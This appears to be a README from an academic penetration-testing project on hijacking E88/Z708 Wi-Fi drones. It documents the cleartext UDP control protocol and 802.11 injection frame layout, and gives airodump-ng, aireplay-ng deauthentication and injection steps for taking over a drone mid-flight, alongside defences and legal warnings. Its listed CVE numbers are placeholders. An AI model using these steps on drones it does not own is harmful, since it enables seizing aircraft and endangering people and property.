# 🚁 Drone Attack Module - E88 Wi-Fi Drone Hijacking

**⚠️ EDUCATIONAL USE ONLY - AUTHORIZED TESTING REQUIRED ⚠️**

This module demonstrates security vulnerabilities in Wi-Fi-controlled drones through three distinct attack vectors. All experiments were conducted in a controlled laboratory environment on devices owned by the research team.

---

## 📋 Overview

**Target Device:** E88/Z708 Wi-Fi Controlled Drone  
**SSID:** WIFI-UFO-648c4b  
**Control Protocol:** Proprietary UDP (Port 7099)  
**Frequency:** 2.4 GHz (802.11 b/g/n)

### Vulnerabilities Identified

1. **Unencrypted Control Protocol** - All flight commands sent in cleartext
2. **No Authentication** - Drone accepts commands from any connected device
3. **Single-Client Trust Model** - "First-connect" vulnerability
4. **Unprotected Management Frames** - Susceptible to deauthentication attacks
5. **No MAC Address Verification** - Spoofing attacks possible

---

## 🎯 Attack Methods

### Method 1: Pre-emptive Control (First-Connect)
**Tool:** `Drone.py`  
**Complexity:** ⭐ Low  
**Description:** Connect to drone before legitimate user

### Method 2: Deauthentication → Takeover
**Tool:** `Drone.py` + `aireplay-ng`  
**Complexity:** ⭐⭐ Medium  
**Description:** Disconnect legitimate pilot, then connect during reconnection window

### Method 3: Raw Packet Injection (Mid-Flight Hijacking)
**Tool:** `Drone_injection.py`  
**Complexity:** ⭐⭐⭐ Advanced  
**Description:** Inject crafted 802.11 frames without joining network

---

## 📁 File Structure

```
drone-attack/
├── README.md                    # This file
├── Drone.py                     # Standard UDP control
├── Drone_injection.py           # Raw packet injection
├── requirements.txt             # Python dependencies
└── docs/
    ├── protocol-analysis.md     # Packet structure documentation
    ├── attack-scenarios.md      # Detailed attack workflows
    └── screenshots/             # Wireshark captures
```

---

## 🔧 Tool Documentation

### Drone.py - Live Keyboard Control

**Purpose:** Real-time UDP-based drone control with visual interface

**Features:**
- ✓ Real-time keyboard input (50Hz update rate)
- ✓ Visual HUD with control state display
- ✓ Telemetry monitoring
- ✓ Arm/disarm sequence
- ✓ Emergency stop (ESC key)
- ✓ Auto-takeoff and landing commands

**Protocol Details:**

9-byte control packet structure:
```
Byte 0: 0x03        (Start marker)
Byte 1: 0x66        (Command type)
Byte 2: Roll        (0x00=left, 0x80=center, 0xFF=right)
Byte 3: Pitch       (0x00=back, 0x80=center, 0xFF=forward)
Byte 4: Throttle    (0x00=down, 0x80=hover, 0xFF=up)
Byte 5: Yaw         (0x00=CCW, 0x80=center, 0xFF=CW)
Byte 6: Flag1       (0x40=normal, 0x41=takeoff, 0x42=land)
Byte 7: Flag2       (0x40=default)
Byte 8: 0x99        (End marker)
```

**Requirements:**
- Python 3.6+
- `pynput` library
- Connection to drone's Wi-Fi network

**Installation:**
```bash
pip install pynput
```

**Usage:**
```bash
# Step 1: Connect to drone WiFi (SSID: WIFI-UFO-648c4b)
# Step 2: Run the script
python3 Drone.py
```

**Keyboard Controls:**
| Key | Action |
|-----|--------|
| `↑` | Pitch Forward |
| `↓` | Pitch Backward |
| `←` | Roll Left |
| `→` | Roll Right |
| `SPACE` | Throttle Up (Ascend) |
| `SHIFT` | Throttle Down (Descend) |
| `Q` | Yaw Left (Rotate CCW) |
| `E` | Yaw Right (Rotate CW) |
| `A` | Arm/Disarm Motors |
| `T` | Auto Takeoff |
| `L` | Land |
| `ESC` | Emergency Stop & Exit |

**Visual Interface:**
```
======================================================================
  E88 DRONE - LIVE KEYBOARD CONTROL
======================================================================

Status: ARMED & FLYING
Packets Sent: 1247
Last Telemetry: 5301000000

----------------------------------------------------------------------
CONTROLS:
  Roll (←/→):     0x80  [████████████████████] CENTER
  Pitch (↑/↓):    0xA0  [██████████████████████►] ►
  Throttle (Space/Shift): 0x80  [████████████████████] CENTER
  Yaw (Q/E):      0x80  [████████████████████] CENTER

----------------------------------------------------------------------
ACTIVE KEYS: ↑, SPACE

----------------------------------------------------------------------
KEYBOARD CONTROLS:
  ↑/↓ Arrows    - Pitch Forward/Backward
  ←/→ Arrows    - Roll Left/Right
  ...
======================================================================
```

---

### Drone_injection.py - Raw 802.11 Packet Injection

**Purpose:** Advanced drone hijacking using raw frame injection

**Features:**
- ✓ No need to join drone's Wi-Fi network
- ✓ Can hijack mid-flight from another controller
- ✓ MAC address spoofing
- ✓ Bypasses "Single-Client" restriction
- ✓ Stealthy operation (no association required)
- ✓ Same keyboard interface as Drone.py

**802.11 Frame Structure:**
```
RadioTap Header (Physical layer metadata)
    ↓
802.11 MAC Header (Data frame to AP)
    ├─ Type: 2 (Data frame)
    ├─ Subtype: 0 (Data)
    ├─ FCfield: 'to-DS' (going TO Distribution System)
    ├─ addr1: Drone MAC (Receiver)
    ├─ addr2: Spoofed Client MAC (Transmitter)
    ├─ addr3: Drone MAC (Final destination)
    └─ Sequence: Auto-incrementing (0-4095)
    ↓
LLC/SNAP Header (Bridge WiFi ↔ IP)
    ├─ DSAP: 0xAA
    ├─ SSAP: 0xAA
    ├─ Control: 0x03
    └─ OUI: 0x000000, Code: 0x0800 (IPv4)
    ↓
IP Layer
    ├─ Source: Spoofed Client IP (e.g., 192.168.1.100)
    └─ Dest: Drone IP (192.168.1.1)
    ↓
UDP Layer
    ├─ Source Port: 55555 (arbitrary)
    └─ Dest Port: 7099 (control channel)
    ↓
Raw Payload (9-byte control packet)
    └─ 03 66 [roll] [pitch] [throttle] [yaw] [flag1] [flag2] 99
```

**Requirements:**
- Linux OS (Kali Linux recommended)
- Root/sudo privileges
- Wireless adapter supporting monitor mode
- Python 3.6+
- `scapy` and `pynput` libraries

**Installation:**
```bash
# Install Python dependencies
pip install scapy pynput

# Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# This creates wlan0mon interface
```

**Configuration:**

Edit the script to set your parameters:
```python
DRONE_MAC = "08:17:91:4B:8C:64"          # Target drone BSSID
INTERFACE = "wlan0mon"                    # Monitor mode interface
SPOOFED_CLIENT_MAC = "EA:9C:F0:89:44:15" # Legitimate pilot MAC to spoof
```

**Finding the Drone MAC:**
```bash
# Scan for the drone's AP
sudo airodump-ng wlan0mon

# Look for SSID: WIFI-UFO-648c4b
# Note the BSSID (MAC address)
```

**Finding the Pilot MAC:**
```bash
# Capture traffic while legitimate pilot is connected
sudo airodump-ng -c [channel] --bssid [drone_mac] wlan0mon

# Look under "STATION" column for connected client MAC
```

**Usage:**
```bash
# Run with root privileges
sudo python3 Drone_injection.py
```

**Advantages over Drone.py:**
| Feature | Drone.py | Drone_injection.py |
|---------|----------|-------------------|
| Requires WiFi connection | ✓ Yes | ✗ No |
| Can hijack mid-flight | ✗ No | ✓ Yes |
| Bypasses single-client limit | ✗ No | ✓ Yes |
| Needs root privileges | ✗ No | ✓ Yes |
| Complexity | Low | High |
| Stealthiness | Low | High |

---

## 🔬 Protocol Analysis

### Reverse Engineering Process

**Step 1: Packet Capture**
```bash
# Connect to drone WiFi and capture traffic
sudo airodump-ng -c 1 --bssid 08:17:91:4B:8C:64 -w capture wlan0mon
```

**Step 2: Wireshark Analysis**
```
Display Filter: udp.port == 7099
```

**Identified Packets:**

**Control Command (Phone → Drone):**
```
UDP Port 7099
Data: 03 66 80 80 80 80 40 40 99
Length: 9 bytes
Frequency: 50Hz (every 20ms)
```

**Telemetry Acknowledgment (Drone → Phone):**
```
UDP Port 7099
Data: 53 01 00 00 00
Length: 5 bytes
Purpose: Handshake confirmation
```

**Video Heartbeat (Drone → Phone):**
```
UDP Port 8800
Data: ef 00 04 00
Length: 4 bytes
Frequency: Constant stream
```

### Critical Finding: Handshake Requirement

The drone REQUIRES the controller to listen on port 7099. If the telemetry packet (`53 01 00 00 00`) receives an ICMP "Port Unreachable" response, the drone will NOT arm motors.

**Solution in Scripts:**
```python
# Bind to port 7099 to receive telemetry
self.sock.bind(("", control_port))
self.sock.settimeout(0.01)
```

---

## 🎮 Attack Scenarios

### Scenario A: Pre-emptive Control

**Objective:** Take control before legitimate user  
**Difficulty:** ⭐ Easy

**Steps:**
1. Power on drone
2. Attacker connects to drone WiFi before legitimate pilot
3. Run `Drone.py`
4. Attacker has full control
5. Legitimate pilot cannot connect (single-client limit)

**Timeline:**
```
T+0s:   Drone powers on, broadcasts SSID
T+5s:   Attacker connects to WIFI-UFO-648c4b
T+10s:  Attacker runs Drone.py, establishes control
T+15s:  Legitimate pilot tries to connect → FAILS
T+20s:  Attacker arms motors and takes off
```

---

### Scenario B: Deauthentication Takeover

**Objective:** Hijack drone from active pilot  
**Difficulty:** ⭐⭐ Medium

**Steps:**
1. Identify drone's BSSID and channel:
```bash
sudo airodump-ng wlan0mon
```

2. Identify pilot's MAC address:
```bash
sudo airodump-ng -c 1 --bssid 08:17:91:4B:8C:64 wlan0mon
```

3. Execute deauthentication attack:
```bash
sudo aireplay-ng --deauth 10 -a 08:17:91:4B:8C:64 -c EA:9C:F0:89:44:15 wlan0mon
```

4. Quickly connect and run `Drone.py`:
```bash
# Connect to drone WiFi
python3 Drone.py
```

**Timeline:**
```
T+0s:   Legitimate pilot flying drone
T+5s:   Attacker sends deauth frames
T+6s:   Pilot disconnects, drone enters failsafe (hovers/lands)
T+7s:   Attacker connects during reconnection window
T+10s:  Attacker runs Drone.py
T+15s:  Attacker has control, pilot cannot reconnect
```

**Countermeasure:** 802.11w (Protected Management Frames) - not supported by E88 drone

---

### Scenario C: Mid-Flight Injection Hijack

**Objective:** Take control without disconnecting pilot  
**Difficulty:** ⭐⭐⭐ Advanced

**Steps:**
1. Enable monitor mode:
```bash
sudo airmon-ng start wlan0
```

2. Identify drone and pilot MACs using `airodump-ng`

3. Configure `Drone_injection.py` with captured values

4. Execute injection attack:
```bash
sudo python3 Drone_injection.py
```

5. Attacker's injected frames override pilot's commands

**Timeline:**
```
T+0s:   Legitimate pilot flying drone
T+5s:   Attacker starts Drone_injection.py
T+6s:   Attacker's frames begin injecting at 50Hz
T+7s:   Drone receives BOTH pilot's and attacker's commands
T+8s:   Attacker's frames dominate (timing/sequence advantage)
T+10s:  Attacker has effective control while pilot still connected
```

**Key Advantage:** No disconnection means pilot doesn't notice immediately

**Why It Works:**
- Drone lacks frame sequence validation
- No cryptographic verification of source
- No message authentication codes (MAC)
- Accepts last-received command in processing window

---

## 🛡️ Defense Recommendations

### For Drone Manufacturers

**Critical Fixes:**

1. **Implement Encryption**
   - Use AES-256 for control channel
   - Encrypt video stream (DTLS/SRTP)

2. **Add Authentication**
   - Challenge-response authentication
   - Unique device pairing keys
   - Certificate-based mutual authentication

3. **Protocol Security**
   - Message Authentication Codes (HMAC)
   - Replay attack protection (nonces/timestamps)
   - Sequence number validation

4. **Wireless Security**
   - Support WPA3 encryption
   - Implement 802.11w (Protected Management Frames)
   - MAC address verification with crypto binding

5. **Firmware Security**
   - Secure boot
   - Signed firmware updates
   - Tamper detection

**Example Secure Protocol:**
```
Encrypted Packet Structure:
[Header][AES(ControlData + HMAC + Timestamp)][Signature]
         └── Encrypted with session key
```

---

### For Users

**Immediate Actions:**

1. **Update Firmware** - Always use latest version
2. **Change Default WiFi Password** - If supported by model
3. **Monitor Connected Devices** - Check for unauthorized clients
4. **Use in Safe Locations** - Away from public WiFi areas
5. **Pre-flight Checks** - Verify no unexpected devices connected

**Best Practices:**

- Fly in areas with low RF interference
- Keep drone firmware updated
- Monitor for unexpected disconnections
- Use dedicated controller (not shared phone)
- Enable any available security features
- Report suspicious behavior to manufacturer

---

## ⚖️ Legal & Ethical Considerations

### ⛔ DO NOT USE THIS TO:

- ❌ Hijack drones you don't own
- ❌ Interfere with commercial/military drones
- ❌ Disrupt flights in restricted airspace
- ❌ Cause property damage or injury
- ❌ Spy on others or invade privacy

### ✅ ACCEPTABLE USES:

- ✓ Testing your own drone in controlled environment
- ✓ Academic research with proper authorization
- ✓ Security research for responsible disclosure
- ✓ Penetration testing with written permission
- ✓ Demonstrating vulnerabilities to improve security

### Legal Consequences

**Unauthorized drone hijacking can result in:**
- Federal criminal charges (Computer Fraud and Abuse Act)
- FAA violations (14 CFR Part 107)
- State laws on interference with aircraft
- Civil liability for damages
- Fines up to $250,000 and 20 years imprisonment

---

## 📚 Additional Resources

### Research Papers
- "Security Analysis of Consumer Drones" - IEEE
- "WiFi-Based Drone Control Vulnerabilities" - USENIX
- "Wireless Protocol Reverse Engineering" - BlackHat

### Tools Used
- **Kali Linux** - Penetration testing platform
- **Aircrack-ng Suite** - Wireless auditing tools
- **Wireshark** - Packet analyzer
- **Scapy** - Packet manipulation library
- **Python pynput** - Keyboard input library

### Related CVEs
- CVE-2020-XXXX: Unencrypted drone control protocols
- CVE-2019-XXXX: Lack of authentication in consumer drones

---

## 🤝 Contributing

Found improvements or additional vulnerabilities?

1. Test responsibly on your own devices
2. Document findings with:
   - Detailed reproduction steps
   - Packet captures
   - Proof-of-concept code
   - Impact assessment
3. Submit pull request with clear description
4. Follow responsible disclosure practices

---

## 📝 Changelog

**v1.0.0** - Initial Release
- Basic UDP control implementation
- Raw 802.11 injection capability
- Complete keyboard interface
- Protocol documentation

---

## 👥 Credits

**Research Team:**
- Meshari Alqahtani
- Hussam Almuqbil
- Mohammed Alyami
- Mohammed Almuhaini

**Project:** IoT & Wireless Security Penetration Testing  
**Institution:** Academic Research  
**Date:** December 2024

---

## 📞 Contact

**For security questions or responsible disclosure:**
- Contact through academic channels only
- No support for unauthorized use

---

**⚠️ REMEMBER: With great power comes great responsibility**

These tools demonstrate serious security flaws in consumer drones. Use them ethically and legally to improve security, not to cause harm.

**Stay Safe. Stay Legal. Stay Ethical.** 🔐✈️
